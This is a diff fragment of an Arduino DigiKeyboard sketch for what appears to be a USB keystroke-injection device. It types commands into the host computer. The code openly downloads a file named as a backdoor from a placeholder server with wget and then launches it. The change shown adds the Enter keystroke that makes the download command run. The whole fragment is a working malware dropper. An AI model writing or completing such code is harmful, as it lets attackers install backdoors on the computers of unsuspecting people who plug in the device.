@@ -18,6 +18,8 @@ void loop() {
 	DigiKeyboard.delay(400); // wait 400 thousandths
 	DigiKeyboard.print('wget http://[backdoor_server]/name_backdoor.exe'); // download the backdoor
 	DigiKeyboard.delay(300); // wait 300 thousandths
+	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
+	DigiKeyboard.delay(300); // wait 300 thousandths
 	DigiKeyboard.print('start name_backdoor.exe'); // run the backdoor
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);// //enter/return
 	digitalWrite(LOW); // Set the port to a low logic level
